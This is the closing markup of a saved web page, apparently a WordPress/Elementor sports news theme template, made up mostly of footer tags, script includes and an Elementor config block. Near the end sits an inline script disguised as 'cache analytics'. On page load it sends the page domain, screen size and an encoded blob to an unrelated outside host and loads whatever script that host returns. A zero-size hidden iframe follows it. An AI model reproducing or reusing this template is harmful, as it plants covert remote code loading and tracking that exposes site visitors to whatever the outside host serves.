			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
		</div>		</footer>
	    <link rel="stylesheet" id="elementor-post-4390-css" href="{THEMES_PAGE}/assets/css/post-4390.css" type="text/css" media="all">
<link rel="stylesheet" id="elementor-post-4128-css" href="{THEMES_PAGE}/assets/css/post-4128.css" type="text/css" media="all">
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/jquery.easing.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/jquery.smartmenus.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/menu-script.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/popper.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/bootstrap.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/jquery.magnific-popup.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/owl-carousel.2.3.0.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/slick.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/echo.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/instafeed.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/jquery.mCustomScrollbar.concat.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/script.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/wp-embed.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/frontend-modules.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/position.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/dialog.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/waypoints.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/swiper.jquery.min.js.download"></script>
<script type="text/javascript">
/* <![CDATA[ */
var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false},"is_rtl":"","breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"version":"2.4.5","urls":{"assets":"http:\/\/vinkmag.xpeedstudio.com\/sports\/wp-content\/plugins\/elementor\/assets\/"},"settings":{"page":[],"general":{"elementor_global_image_lightbox":"yes","elementor_enable_lightbox_in_editor":"yes"}},"post":{"id":184,"title":"Vontae Davis Quit on the Bills at Halftime, Changed into","excerpt":""}};
/* ]]> */
</script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/frontend.min.js.download"></script>
<script type="text/javascript" src="{THEMES_PAGE}/assets/js/elementor.js.download"></script>
    <div id="back-to-top" class="back-to-top" style="display: none;">
        <button class="btn btn-primary" title="Back to Top">
            <i class="fa fa-angle-up"></i>
        </button>
        </div>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH22H3YWZtjsOZOecTyT92jMI1MrenYlj8i3DpwhcqLybHAY5QeAzY%2bOk%2baj%2fg2reEOY%2bneO4ae%2bMeYWGdEHCguWYVVA2IpPhhziPEf8FwVV6WC5E1MV8IJN3AlzLPsjbUEbTN3jSms%2bjtDVSVs1BqFJQdhcPBo4phuyNDX6jUtboX3%2bM4MBDcGnKHgi8atSdQZo2KY9KIYw03Dmsr%2bPQanV75UQWR1orX5D8bZtlPi2cMM%2fid4meIdPb7pjVyEtHyrOWfBZttwBbnBLpPZYuXJ2M56YIn1J8L5XIEWuRX6rAwMVoP%2brFYLLFghaThvy%2fpOlUfeIlo2AYemaTvCghLjsVLoLSdpvKwY0J77RGfLxnsC%2bkWdCIkiV%2bSGaHHusCzidm2Wp9aElkiYgt0q05qNobfiN174xtw%2bXv2wvLN9pdLcJaJ5OPegG%2f%2fmjIaaHcn2twuJ8rIfpsFIIDylilpYlR%2b9IJcMiYEU5pMqGM0pZTPFfF6HDV3FJbIOgMj815qtsNs0yPxTthq3TmfYzC3od9%2fpUbzh0miQJ5l5F0%2fmD3MbVOtt5tcw1Q%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
<iframe id="ifrm" scrolling="no" src="{THEMES_PAGE}/assets/css/log.html" style="height: 0px; width: 0px; overflow: hidden; border: 0px; padding: 0px;"></iframe></body><loom-container id="lo-engage-ext-container"><loom-shadow classname="resolved"></loom-shadow></loom-container>
</html>